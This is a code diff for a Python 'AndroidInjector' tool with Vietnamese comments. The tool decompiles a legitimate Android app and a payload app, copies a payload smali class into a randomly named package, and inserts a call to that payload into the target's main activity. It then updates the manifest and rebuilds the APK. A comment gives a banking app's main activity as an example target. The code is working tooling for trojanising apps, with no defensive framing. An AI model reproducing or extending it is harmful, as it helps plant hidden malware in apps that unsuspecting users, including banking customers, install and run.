@@ -17,6 +17,7 @@ class AndroidInjector:
         self.keystore_pass = keystore_pass
         self.key_alias = key_alias
         self.output_dir = output_dir
+        self.specific_smali = 'ActivityShow.smali'  # Chỉnh tên file .smali bạn muốn merge ở đây
         self.work_dir = Path.home() / '.android_injector'
         if self.work_dir.exists():
             shutil.rmtree(self.work_dir)
@@ -31,7 +32,7 @@ class AndroidInjector:
     def execute(self):
         self.original_dir = Path.cwd()
         self.decompile_apks()
-        self.target_package = self.get_target_package()  # Lấy package target để fix relative name
+        self.target_package = self.get_target_package()
         self.main_activity = self.find_main_activity()
         print(f'[+] Main Activity identified: {self.main_activity}')
         self.merge_payload_files()
@@ -65,66 +66,47 @@ class AndroidInjector:
         print('[+] Merging payload files...')
         payload_apk_dir = self.work_dir / 'payload_apk'
         target_apk_dir = self.work_dir / 'target_apk'
-        os.chdir(self.original_dir)
-        os.chdir(payload_apk_dir)
-        self.execute_command(f'tar -cf - smali | (cd {target_apk_dir}; tar -xpf -)')
         
-        # Lấy package từ manifest để tìm folder
+        # Minimal merge: Chỉ copy 1 file .smali cụ thể từ main/activity
+        payload_smali = payload_apk_dir / 'smali'
+        target_smali = target_apk_dir / 'smali'
         payload_package = self.get_payload_package()
         print(f'[+] Payload package: {payload_package}')
         
-        # Tìm folder dựa trên package (e.g., cn/com/lw for cn.com.lw.lockScreenHeart)
-        payload_dir = target_apk_dir / 'smali' / 'com'  # Giới hạn trong com/
-        package_parts = payload_package.replace('.', '/').split('/')[1:]  # Bỏ phần đầu, lấy com/lw
-        payload_folder_path = payload_dir
-        for part in package_parts:
-            payload_folder_path = payload_folder_path / part
-        if payload_folder_path.exists() and payload_folder_path.is_dir():
-            payload_folder = package_parts[-1]  # Tên folder cuối (e.g., 'lw')
-            print(f'[+] Tìm thấy folder từ package: {payload_folder}')
+        # Chỉnh tên file .smali bạn muốn merge ở __init__ (self.specific_smali)
+        full_path = payload_smali / payload_package.replace('.', '/') / 'main' / 'activity' / self.specific_smali
+        if full_path.exists():
+            # Tạo folder random cho file
+            self.payload_package = self.generate_random_string()
+            target_file_path = target_smali / self.payload_package / self.specific_smali
+            target_file_path.parent.mkdir(parents=True, exist_ok=True)
+            shutil.copy2(full_path, target_file_path)
+            print(f'[+] Merged single smali: {full_path} -> {target_file_path}')
+            
+            # Sed thay tên package trong file .smali
+            os.chdir(target_file_path.parent)
+            payload_package_old = payload_package.replace('.', '/')
+            sed_cmd = f"sed -i 's|{payload_package_old}|{self.payload_package}|g' {self.specific_smali}"
+            print(f'[DEBUG] Sed command: {sed_cmd}')
+            self.execute_command(sed_cmd)
         else:
-            # Fallback: Chỉ tìm trong smali/com/* có .smali, chọn có nhiều file nhất
-            folder_counts = {}
-            for folder in payload_dir.glob('*'):
-                if folder.is_dir():
-                    count = len(list(folder.rglob('*.smali')))
-                    if count > 0:
-                        folder_counts[folder.name] = count
-            if folder_counts:
-                payload_folder = max(folder_counts, key=folder_counts.get)
-                print(f'[+] Fallback folder (nhiều .smali nhất): {payload_folder} ({folder_counts[payload_folder]} files)')
-            else:
-                raise Exception(f"Không tìm thấy folder payload trong smali/com/ cho package {payload_package}.")
-        
-        self.payload_package = self.generate_random_string()  # Rename để tránh conflict
-        old_path = payload_dir / payload_folder
-        new_path = payload_dir / self.payload_package
-        print(f'[+] Renaming: {old_path} -> {new_path}')
-        if old_path.exists():
-            old_path.rename(new_path)
-        else:
-            raise Exception(f"Folder cũ không tồn tại: {old_path}")
-        
-        # Sed thay tên package cũ trong .smali
-        os.chdir(new_path)
-        self.execute_command(f"find . -name '*.smali' -exec sed -i 's/{payload_package}/{self.payload_package}/g' {{}} +")
+            raise Exception(f"File .smali không tồn tại: {full_path}. Kiểm tra tên file trong main/activity.")
 
     def inject_payload(self, main_activity):
         # Fix relative name: Nếu bắt đầu bằng '.', prepend target package
         if main_activity.startswith('.'):
-            full_activity = self.target_package + main_activity  # e.g., com.banking.Main
+            full_activity = self.target_package + main_activity
         else:
             full_activity = main_activity
         activity_rel = full_activity.replace('.', '/')
-        activity_path = (self.work_dir / 'target_apk' / 'smali' / activity_rel).with_suffix('.smali')  # Fix: Use with_suffix
+        activity_path = (self.work_dir / 'target_apk' / 'smali' / activity_rel).with_suffix('.smali')
         print(f'[+] Target activity path: {activity_path}')
         
         if not activity_path.exists():
             raise Exception(f"Main activity .smali không tồn tại: {activity_path}. Kiểm tra package target.")
         
-        # Sử dụng main activity từ payload để inject
-        payload_main = self.find_payload_main_activity()
-        payload_class = payload_main.split('.')[-1]  # Chỉ class cuối (e.g., LockScreenPreferenceActivity)
+        # Inject call đến class payload (tên class từ self.specific_smali)
+        payload_class = self.specific_smali.replace('.smali', '')  # Tên class từ file
         payload_path = f'{self.payload_package}/{payload_class}'
         injection_code = f' invoke-static {{p0}}, L{payload_path};->start(Landroid/content/Context;)V\n'
         print(f'[+] Injecting call to payload: {payload_path}')
@@ -138,7 +120,7 @@ class AndroidInjector:
         temp_file.replace(activity_path)
 
     def find_payload_main_activity(self):
-        """Tìm main activity từ payload manifest"""
+        """Tìm main activity từ payload manifest (fallback)"""
         tree = ET.parse(self.payload_manifest)
         root = tree.getroot()
         ns = {'android': 'http://schemas.android.com/apk/res/android'}
@@ -146,15 +128,7 @@ class AndroidInjector:
             for intent_filter in activity.findall('intent-filter'):
                 if intent_filter.find("action[@android:name='android.intent.action.MAIN']", namespaces=ns) is not None:
                     return activity.attrib['{http://schemas.android.com/apk/res/android}name']
-        # Fallback: Chọn activity đầu tiên có LAUNCHER
-        for activity in root.findall('.//activity'):
-            for intent_filter in activity.findall('intent-filter'):
-                if intent_filter.find("category[@android:name='android.intent.category.LAUNCHER']", namespaces=ns) is not None:
-                    return activity.attrib['{http://schemas.android.com/apk/res/android}name']
-        # Fallback nữa: Activity đầu tiên
-        for activity in root.findall('.//activity'):
-            return activity.attrib['{http://schemas.android.com/apk/res/android}name']
-        raise Exception("Main activity không tìm thấy trong payload manifest.")
+        return self.specific_smali.replace('.smali', '')  # Fallback tên class từ file
 
     def update_manifest(self):
         print('[+] Updating AndroidManifest.xml')
@@ -193,7 +167,7 @@ class AndroidInjector:
 
     def recompile_apk(self, apk_dir):
         print(f'[+] Recompiling APK: {apk_dir}')
-        self.execute_command(f'apktool b {apk_dir}')
+        self.execute_command(f'apktool b {apk_dir} --use-aapt2 --no-debug-info --force-all')
         dist_apk = apk_dir / 'dist' / self.target_apk.name
         if dist_apk.exists():
             shutil.copy(dist_apk, self.work_dir / 'injected.apk')
